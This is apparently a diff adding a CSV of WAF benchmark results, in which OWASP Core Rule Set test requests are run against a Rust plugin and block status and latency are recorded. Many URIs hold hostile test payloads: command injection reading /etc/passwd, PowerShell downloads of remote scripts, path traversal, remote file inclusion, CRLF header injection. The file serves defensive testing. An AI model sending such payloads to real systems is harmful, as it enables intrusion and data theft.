@@ -1,0 +1,397 @@
+plugin,id,file,test_file,test_id,method,uri,body_bytes,load_seconds,status,log_hit,control_status,target_dependent,rps,p50_ms,p95_ms,statuses,error
+rust,911011,REQUEST-911-METHOD-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,911012,REQUEST-911-METHOD-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,911100,REQUEST-911-METHOD-ENFORCEMENT.conf,911100.yaml,6,DELETE,/delete,0,0.69,403,0,200,1,43.8,72.69,143.65,403:8,
+rust,911013,REQUEST-911-METHOD-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,911014,REQUEST-911-METHOD-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,911015,REQUEST-911-METHOD-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,911016,REQUEST-911-METHOD-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,911017,REQUEST-911-METHOD-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,911018,REQUEST-911-METHOD-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,913011,REQUEST-913-SCANNER-DETECTION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,913012,REQUEST-913-SCANNER-DETECTION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,913100,REQUEST-913-SCANNER-DETECTION.conf,913100.yaml,1,GET,/get,0,0.75,403,0,200,1,44.9,73.98,111.51,403:8,
+rust,913013,REQUEST-913-SCANNER-DETECTION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,913014,REQUEST-913-SCANNER-DETECTION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,913015,REQUEST-913-SCANNER-DETECTION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,913016,REQUEST-913-SCANNER-DETECTION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,913017,REQUEST-913-SCANNER-DETECTION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,913018,REQUEST-913-SCANNER-DETECTION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920011,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920012,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920100,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920100.yaml,10,REALLYLONGUNREALMETHOD,/,0,0.94,400,0,400,0,36.9,92.73,124.44,400:8,target-independent HTTP 400
+rust,920120,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920120.yaml,1,POST,/,162,0.95,400,0,400,0,42.4,93.56,94.44,400:8,target-independent HTTP 400
+rust,920160,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920170,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920170.yaml,2,GET,/,7,0.99,403,0,200,1,44.9,74.22,110.8,403:8,
+rust,920171,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920180,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920181,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920190,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920190.yaml,2,GET,/,0,1.01,200,0,,0,,,,,target rule not proven
+rust,920660,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920660.yaml,3,GET,/audio.mp3,0,1.01,200,0,,0,,,,,target rule not proven
+rust,920210,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920210.yaml,4,GET,/,0,0.69,200,0,,0,,,,,target rule not proven
+rust,920250,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920250.yaml,3,GET,/?param=%F5%80%BF%BF,0,0.72,200,0,,0,,,,,target rule not proven
+rust,920260,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920260.yaml,3,GET,/get?param=foo%uFF01,0,1.03,200,0,,0,,,,,target rule not proven
+rust,920270,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920270.yaml,1,GET,/?test%00=test1,0,0.71,403,0,200,1,45.5,70.73,106.43,403:8,
+rust,920280,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920290,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920310,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920310.yaml,4,GET,/,0,0.71,200,0,,0,,,,,target rule not proven
+rust,920311,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920311.yaml,1,GET,/,0,0.69,200,0,,0,,,,,target rule not proven
+rust,920330,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920330.yaml,1,GET,/,0,0.69,200,0,,0,,,,,target rule not proven
+rust,920340,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920350,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920350.yaml,4,GET,/,0,0.73,200,0,,0,,,,,target rule not proven
+rust,920380,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920380.yaml,1,GET,/?param1=1&param2=1&param3=1&param4=1&param5=1&param6=1&param7=1&param8=1&param9=1&param10=1&param11=1&param12=1&param13=1&param14=1&param15=1&param16=1&param17=1&param18=1&param19=1&param20=1&param21=1&param22=1&param23=1&param24=1&param25=1&param26=1&param27=1&param28=1&param29=1&param30=1&param31=1&param32=1&param33=1&param34=1&param35=1&param36=1&param37=1&param38=1&param39=1&param40=1&param41=1&param42=1&param43=1&param44=1&param45=1&param46=1&param47=1&param48=1&param49=1&param50=1&param51=1&param52=1&param53=1&param54=1&param55=1&param56=1&param57=1&param58=1&param59=1&param60=1&param61=1&param62=1&param63=1&param64=1&param65=1&param66=1&param67=1&param68=1&param69=1&param70=1&param71=1&param72=1&param73=1&param74=1&param75=1&param76=1&param77=1&param78=1&param79=1&param80=1&param81=1&param82=1&param83=1&param84=1&param85=1&param86=1&param87=1&param88=1&param89=1&param90=1&param91=1&param92=1&param93=1&param94=1&param95=1&param96=1&param97=1&param98=1&param99=1&param100=1&param101=1&param102=1&param103=1&param104=1&param105=1&param106=1&param107=1&param108=1&param109=1&param110=1&param111=1&param112=1&param113=1&param114=1&param115=1&param116=1&param117=1&param118=1&param119=1&param120=1&param121=1&param122=1&param123=1&param124=1&param125=1&param126=1&param127=1&param128=1&param129=1&param130=1&param131=1&param132=1&param133=1&param134=1&param135=1&param136=1&param137=1&param138=1&param139=1&param140=1&param141=1&param142=1&param143=1&param144=1&param145=1&param146=1&param147=1&param148=1&param149=1&param150=1&param151=1&param152=1&param153=1&param154=1&param155=1&param156=1&param157=1&param158=1&param159=1&param160=1&param161=1&param162=1&param163=1&param164=1&param165=1&param166=1&param167=1&param168=1&param169=1&param170=1&param171=1&param172=1&param173=1&param174=1&param175=1&param176=1&param177=1&param178=1&param179=1&param180=1&param181=1&param182=1&param183=1&param184=1&param185=1&param186=1&param187=1&param188=1&param189=1&param190=1&param191=1&param192=1&param193=1&param194=1&param195=1&param196=1&param197=1&param198=1&param199=1&param200=1&param201=1&param202=1&param203=1&param204=1&param205=1&param206=1&param207=1&param208=1&param209=1&param210=1&param211=1&param212=1&param213=1&param214=1&param215=1&param216=1&param217=1&param218=1&param219=1&param220=1&param221=1&param222=1&param223=1&param224=1&param225=1&param226=1&param227=1&param228=1&param229=1&param230=1&param231=1&param232=1&param233=1&param234=1&param235=1&param236=1&param237=1&param238=1&param239=1&param240=1&param241=1&param242=1&param243=1&param244=1&param245=1&param246=1&param247=1&param248=1&param249=1&param250=1&param251=1&param252=1&param253=1&param254=1&param255=1&param256=1,0,1.0,200,0,,0,,,,,target rule not proven
+rust,920360,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920360.yaml,1,GET,/?11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111=foo,0,0.73,200,0,,0,,,,,target rule not proven
+rust,920370,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920370.yaml,1,GET,/?foo=11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111,0,0.69,200,0,,0,,,,,target rule not proven
+rust,920390,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920390.yaml,1,POST,/post,64005,1.02,200,0,,0,,,,,target rule not proven
+rust,920400,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920410,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920410.yaml,1,POST,/,66505,0.99,400,0,400,0,33.9,101.91,129.43,400:8,target-independent HTTP 400
+rust,920470,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920470.yaml,1,GET,/,0,0.97,403,0,200,1,50.8,78.46,117.65,403:8,
+rust,920420,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920420.yaml,2,POST,/,4,0.97,403,0,200,1,51.5,77.46,113.76,403:8,
+rust,920480,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920480.yaml,14,POST,/,10,1.02,403,0,200,1,53.0,74.25,108.84,403:8,
+rust,920530,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920530.yaml,2,POST,/,10,1.02,403,0,200,1,44.5,72.88,141.79,403:8,
+rust,920640,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920430,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920440,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920440.yaml,1,GET,/get/foo.bak,0,0.71,403,0,200,1,55.2,71.52,106.89,403:8,
+rust,920500,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920500.yaml,1,GET,/index.php~,0,0.7,403,0,200,1,53.3,73.14,109.86,403:8,
+rust,920450,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920450.yaml,1,GET,/,0,0.72,403,0,200,1,45.4,74.04,109.26,403:8,
+rust,920520,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920520.yaml,7,GET,/,0,0.68,403,0,200,1,53.6,74.16,110.44,403:8,
+rust,920600,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920600.yaml,1,GET,/,0,0.72,403,0,200,1,45.3,72.02,139.67,403:8,
+rust,920539,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920540,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920540.yaml,1,POST,/,20,0.69,403,0,200,1,44.9,72.86,110.59,403:8,
+rust,920610,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920620,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920013,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920014,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920200,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920200.yaml,4,GET,/,0,0.98,200,0,,0,,,,,target rule not proven
+rust,920201,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920201.yaml,2,GET,/get/index%2Epdf,0,0.69,200,0,,0,,,,,target rule not proven
+rust,920230,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920230.yaml,1,GET,/?parm=%25%37%33%25%36%46%25%36%44%25%36%35%25%37%34%25%36%35%25%37%38%25%37%34%25%35%46%25%33%31%25%33%32%25%33%33%25%33%34,0,1.01,200,0,,0,,,,,target rule not proven
+rust,920271,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920271.yaml,1,GET,/?test=test1%127,0,1.01,403,0,200,1,45.2,72.19,140.46,403:8,
+rust,920320,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920320.yaml,1,GET,/,0,0.67,200,0,,0,,,,,target rule not proven
+rust,920121,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920121.yaml,1,POST,/,157,0.97,400,0,400,0,42.0,94.25,95.61,400:8,target-independent HTTP 400
+rust,920451,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920451.yaml,1,GET,/,0,0.7,403,0,200,1,48.1,83.08,117.25,403:8,
+rust,920240,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920240.yaml,6,POST,/,42,0.72,200,0,,0,,,,,target rule not proven
+rust,920650,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920650.yaml,1,POST,/api/resource?_method=DELETE,0,1.03,403,0,200,1,54.0,72.99,109.48,403:8,
+rust,920015,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920016,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920272,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920272.yaml,1,GET,/?test=test1%25,0,1.01,403,0,200,1,52.5,75.93,111.47,403:8,
+rust,920300,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920300.yaml,1,GET,/,0,1.02,200,0,,0,,,,,target rule not proven
+rust,920490,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920490.yaml,1,POST,/post,40,1.0,403,0,200,1,45.4,79.11,116.75,403:8,
+rust,920510,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920510.yaml,1,GET,/,0,1.03,403,0,200,1,41.8,80.44,124.71,403:8,
+rust,920521,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920521.yaml,7,GET,/,0,1.05,403,0,200,1,45.7,71.83,107.75,403:8,
+rust,920017,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920018,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,,,,,,,,,,,,,,,no usable official request case
+rust,920202,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920202.yaml,2,GET,/get/index%2Epdf,0,0.74,200,0,,0,,,,,target rule not proven
+rust,920273,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920273.yaml,1,GET,/?test=test1%20,0,1.0,403,0,200,1,54.0,73.74,109.08,403:8,
+rust,920274,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920274.yaml,4,GET,/get?test=test1HI,0,1.0,403,0,200,1,52.1,73.53,112.37,403:8,
+rust,920275,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920275.yaml,1,GET,/,0,0.7,403,0,200,1,53.0,73.6,110.13,403:8,
+rust,920460,REQUEST-920-PROTOCOL-ENFORCEMENT.conf,920460.yaml,2,GET,/?file=cat+/etc/pa\ssw\d,0,1.02,403,0,200,1,52.2,74.45,115.22,403:8,
+rust,921011,REQUEST-921-PROTOCOL-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,921012,REQUEST-921-PROTOCOL-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,921110,REQUEST-921-PROTOCOL-ATTACK.conf,921110.yaml,1,POST,/,22,0.7,403,0,200,1,43.3,74.26,144.15,403:8,
+rust,921120,REQUEST-921-PROTOCOL-ATTACK.conf,921120.yaml,1,GET,/?lang=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Shazam</html>,0,0.68,403,0,200,1,45.2,73.03,109.62,403:8,
+rust,921130,REQUEST-921-PROTOCOL-ATTACK.conf,921130.yaml,1,GET,/?lang=foobar%3Cmeta%20http-equiv%3D%22Refresh%22%20content%3D%220%3B%20url%3Dhttp%3A%2F%2Fwww.hacker.com%2F%22%3E,0,1.01,403,0,200,1,52.8,73.99,111.12,403:8,
+rust,921140,REQUEST-921-PROTOCOL-ATTACK.conf,921140.yaml,2,GET,/,0,0.73,403,0,200,1,54.1,73.54,109.17,403:8,
+rust,921150,REQUEST-921-PROTOCOL-ATTACK.conf,921150.yaml,1,GET,/get/script.jsp?variableX=bar&variable2=Y&%0d%0restofdata,0,0.67,403,0,200,1,45.2,71.06,139.18,403:8,
+rust,921160,REQUEST-921-PROTOCOL-ATTACK.conf,921160.yaml,1,GET,/script_rule921160.jsp?variableX=bar&variable2=Y&%0d%0Remote-addr%0d%0d%0d:%20foo.bar.com,0,0.71,403,0,200,1,54.3,73.2,109.51,403:8,
+rust,921190,REQUEST-921-PROTOCOL-ATTACK.conf,921190.yaml,1,GET,/foo%0Abar,0,0.76,403,0,200,1,45.0,72.56,108.98,403:8,
+rust,921200,REQUEST-921-PROTOCOL-ATTACK.conf,921200.yaml,13,POST,/,13,0.7,403,0,200,1,45.4,72.84,138.32,403:8,
+rust,921421,REQUEST-921-PROTOCOL-ATTACK.conf,921421.yaml,1,POST,/post,0,0.68,403,0,200,1,44.8,72.71,140.32,403:8,
+rust,921240,REQUEST-921-PROTOCOL-ATTACK.conf,921240.yaml,1,GET,/?unix:AAAAAAAAA|http://coreruleset.org/,0,0.7,403,0,200,1,45.6,73.01,108.6,403:8,
+rust,921250,REQUEST-921-PROTOCOL-ATTACK.conf,921250.yaml,1,GET,/,0,0.7,403,0,200,1,55.4,71.95,106.99,403:8,
+rust,921013,REQUEST-921-PROTOCOL-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,921014,REQUEST-921-PROTOCOL-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,921151,REQUEST-921-PROTOCOL-ATTACK.conf,921151.yaml,1,GET,/get?941151-1=test%0Dnext=more,0,0.75,403,0,200,1,45.5,71.64,106.46,403:8,
+rust,921422,REQUEST-921-PROTOCOL-ATTACK.conf,921422.yaml,1,POST,/post,0,0.72,403,0,200,1,54.7,72.66,106.78,403:8,
+rust,921015,REQUEST-921-PROTOCOL-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,921016,REQUEST-921-PROTOCOL-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,921230,REQUEST-921-PROTOCOL-ATTACK.conf,921230.yaml,1,GET,/,0,0.69,403,0,200,1,44.8,72.72,109.51,403:8,
+rust,921170,REQUEST-921-PROTOCOL-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,921180,REQUEST-921-PROTOCOL-ATTACK.conf,921180.yaml,6,GET,/?pineapple=pizza&pineapple=aint-pizza&pineapple=is-pizza&pineapple=aint-pizza2,0,0.77,200,0,,0,,,,,target rule not proven
+rust,921210,REQUEST-921-PROTOCOL-ATTACK.conf,921210.yaml,1,GET,/?foo[1]a=bar&foo[1]b=<evil>,0,0.99,403,0,200,1,55.0,72.22,106.65,403:8,
+rust,921017,REQUEST-921-PROTOCOL-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,921018,REQUEST-921-PROTOCOL-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,921220,REQUEST-921-PROTOCOL-ATTACK.conf,921220.yaml,1,GET,/get?foo[1]=bar,0,0.74,403,0,200,1,45.7,71.79,107.29,403:8,
+rust,922160,REQUEST-922-MULTIPART-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,922100,REQUEST-922-MULTIPART-ATTACK.conf,922100.yaml,1,POST,/post,196,0.69,403,0,200,1,51.8,75.84,113.64,403:8,
+rust,922140,REQUEST-922-MULTIPART-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,922150,REQUEST-922-MULTIPART-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,922110,REQUEST-922-MULTIPART-ATTACK.conf,922110.yaml,3,POST,/,285,0.7,200,0,,0,,,,,target rule not proven
+rust,922120,REQUEST-922-MULTIPART-ATTACK.conf,922120.yaml,1,POST,/post,162,0.72,403,0,200,1,44.9,78.1,114.94,403:8,
+rust,922130,REQUEST-922-MULTIPART-ATTACK.conf,,,,,,,,,,,,,,,no usable official request case
+rust,930011,REQUEST-930-APPLICATION-ATTACK-LFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,930012,REQUEST-930-APPLICATION-ATTACK-LFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,930100,REQUEST-930-APPLICATION-ATTACK-LFI.conf,930100.yaml,1,GET,/get,0,0.99,403,0,200,1,53.8,72.26,109.77,403:8,
+rust,930110,REQUEST-930-APPLICATION-ATTACK-LFI.conf,930110.yaml,1,GET,/get,0,1.04,403,0,200,1,54.6,71.94,108.59,403:8,
+rust,930120,REQUEST-930-APPLICATION-ATTACK-LFI.conf,930120.yaml,1,GET,/get/index.php?file=News&op=../../../../../boot.ini%00,0,1.03,403,0,200,1,53.0,73.68,110.45,403:8,
+rust,930130,REQUEST-930-APPLICATION-ATTACK-LFI.conf,930130.yaml,1,GET,/get/sys/class,0,0.71,403,0,200,1,52.9,75.22,111.88,403:8,
+rust,930140,REQUEST-930-APPLICATION-ATTACK-LFI.conf,930140.yaml,1,GET,/.claude/settings.json,0,0.99,403,0,200,1,54.5,73.18,108.15,403:8,
+rust,930013,REQUEST-930-APPLICATION-ATTACK-LFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,930014,REQUEST-930-APPLICATION-ATTACK-LFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,930121,REQUEST-930-APPLICATION-ATTACK-LFI.conf,930121.yaml,1,GET,/get,0,1.01,403,0,200,1,53.7,73.46,110.42,403:8,
+rust,930015,REQUEST-930-APPLICATION-ATTACK-LFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,930016,REQUEST-930-APPLICATION-ATTACK-LFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,930017,REQUEST-930-APPLICATION-ATTACK-LFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,930018,REQUEST-930-APPLICATION-ATTACK-LFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,931011,REQUEST-931-APPLICATION-ATTACK-RFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,931012,REQUEST-931-APPLICATION-ATTACK-RFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,931100,REQUEST-931-APPLICATION-ATTACK-RFI.conf,931100.yaml,1,GET,/get/wp-content/themes/thedawn/lib/scripts/timthumb.php?src=http://66.240.183.75/crash.php,0,0.98,403,0,200,1,44.9,72.52,108.53,403:8,
+rust,931110,REQUEST-931-APPLICATION-ATTACK-RFI.conf,931110.yaml,1,GET,/get/plugins/spamx/BaseAdmin.class.php?_CONF[path]=https://foo.bar,0,0.73,403,0,200,1,43.9,75.03,144.15,403:8,
+rust,931120,REQUEST-931-APPLICATION-ATTACK-RFI.conf,931120.yaml,1,GET,/get?x=file?,0,0.99,403,0,200,1,53.6,73.58,110.61,403:8,
+rust,931013,REQUEST-931-APPLICATION-ATTACK-RFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,931014,REQUEST-931-APPLICATION-ATTACK-RFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,931130,REQUEST-931-APPLICATION-ATTACK-RFI.conf,931130.yaml,1,GET,/get?x=file://foo.bar,0,1.02,403,0,200,1,53.9,73.66,109.31,403:8,
+rust,931131,REQUEST-931-APPLICATION-ATTACK-RFI.conf,931131.yaml,1,GET,/get/file:%2f%2f/usr/src/blog/app/assets/javascripts/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd,0,1.01,403,0,200,1,52.6,75.77,113.54,403:8,
+rust,931015,REQUEST-931-APPLICATION-ATTACK-RFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,931016,REQUEST-931-APPLICATION-ATTACK-RFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,931017,REQUEST-931-APPLICATION-ATTACK-RFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,931018,REQUEST-931-APPLICATION-ATTACK-RFI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,932011,REQUEST-932-APPLICATION-ATTACK-RCE.conf,,,,,,,,,,,,,,,no usable official request case
+rust,932012,REQUEST-932-APPLICATION-ATTACK-RCE.conf,,,,,,,,,,,,,,,no usable official request case
+rust,932230,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932230.yaml,13,POST,/post,123,1.34,403,0,200,1,44.7,80.31,116.2,403:8,
+rust,932235,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932235.yaml,1,POST,/post,44,1.43,403,0,200,1,51.5,74.52,114.29,403:8,
+rust,932120,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932120.yaml,1,GET,/get?932120-1=Invoke-WebRequest%20http://example.com/path/file.ps1,0,1.35,403,0,200,1,45.5,72.09,108.27,403:8,
+rust,932125,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932125.yaml,1,GET,/get?cmd=%3Biwr%20http://example.com/path/file.ps1,0,1.35,403,0,200,1,54.7,72.44,108.1,403:8,
+rust,932130,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932130.yaml,1,GET,/get?932130-1=$(cmd),0,1.11,403,0,200,1,45.2,72.39,108.56,403:8,
+rust,932140,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932140.yaml,1,GET,/get?foo=for%20%25variable%20in%20%28set%29%20do%20command,0,1.31,403,0,200,1,45.2,71.25,107.4,403:8,
+rust,932270,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932270.yaml,1,GET,/get?932270-1=%7E%2B,0,1.42,403,0,200,1,53.7,74.14,108.68,403:8,
+rust,932280,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932280.yaml,1,GET,/get?932280-1=%7b%6c%2c%2d%6c%68%7d%73,0,1.37,403,0,200,1,43.0,75.12,148.89,403:8,
+rust,932250,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932250.yaml,4,POST,/post,46,1.32,403,0,200,1,45.0,74.39,108.27,403:8,
+rust,932260,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932260.yaml,6,POST,/post,47,1.41,403,0,200,1,44.9,76.34,140.98,403:8,
+rust,932340,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932340.yaml,1,GET,/get?arg=%3Bps,0,1.38,403,0,200,1,50.7,78.36,112.69,403:8,
+rust,932330,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932330.yaml,1,GET,/get?rce=!-1!-2,0,1.38,403,0,200,1,45.2,72.55,108.57,403:8,
+rust,932160,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932160.yaml,1,GET,/get?932160-1=cat%20/etc/passwd,0,1.38,403,0,200,1,51.8,76.78,111.68,403:8,
+rust,932170,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932170.yaml,1,GET,/get,0,1.34,403,0,200,1,32.7,99.08,146.83,403:8,
+rust,932171,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932171.yaml,1,GET,/get?%28%29%20%7B,0,1.41,403,0,200,1,52.0,74.93,113.48,403:8,
+rust,932175,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932175.yaml,1,GET,/get?rce=alias%20eennvv%3Denv%26eennvv%20whoami,0,1.35,403,0,200,1,44.7,73.77,141.89,403:8,
+rust,932180,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932180.yaml,1,GET,/get,0,1.46,403,0,200,1,45.0,74.93,113.41,403:8,
+rust,932370,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932370.yaml,1,GET,/get?cmd%3D%3B%20regedit%20%2FE%20c%3A%5Cads%5Cfile.txt%3Aregfile.reg%20HKEY_CURRENT_USER%5CMyCustomRegKey,0,1.39,403,0,200,1,38.8,84.79,166.36,403:8,
+rust,932380,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932380.yaml,1,GET,/get?view%3Dimage.jpg%26bcdboot%20%3C%20file.txt,0,1.35,403,0,200,1,45.4,70.7,138.99,403:8,
+rust,932013,REQUEST-932-APPLICATION-ATTACK-RCE.conf,,,,,,,,,,,,,,,no usable official request case
+rust,932014,REQUEST-932-APPLICATION-ATTACK-RCE.conf,,,,,,,,,,,,,,,no usable official request case
+rust,932371,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932371.yaml,1,GET,"/get?cmd=;at%202:00%20""echo%20test""",0,1.32,403,0,200,1,44.4,74.81,109.78,403:8,
+rust,932231,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932231.yaml,1,POST,/post,111,1.35,403,0,200,1,44.5,74.31,140.11,403:8,
+rust,932131,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932131.yaml,1,GET,/get,0,1.32,403,0,200,1,45.9,70.99,106.95,403:8,
+rust,932200,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932200.yaml,1,GET,/get?host=www.google.com;/bin/ca?+/et*/passwd,0,1.34,403,0,200,1,46.0,71.19,106.71,403:8,
+rust,932205,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932205.yaml,1,GET,/get,0,1.35,403,0,200,1,54.7,73.0,109.64,403:8,
+rust,932206,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932206.yaml,1,GET,/get,0,1.41,403,0,200,1,54.6,72.31,108.87,403:8,
+rust,932207,REQUEST-932-APPLICATION-ATTACK-RCE.conf,,,,,,,,,,,,,,,no usable official request case
